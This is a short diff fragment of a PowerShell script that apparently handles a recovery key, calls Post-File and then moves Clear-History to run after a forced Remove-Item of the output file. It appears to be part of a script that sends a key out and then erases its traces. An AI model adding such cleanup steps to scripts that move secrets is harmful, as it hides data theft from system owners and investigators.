@@ -37,5 +37,5 @@ if ($RecoveryKey.Length -gt 5) {
 
 Post-File
 
-Clear-History
 Remove-Item -Path $outpath -Force
+Clear-History
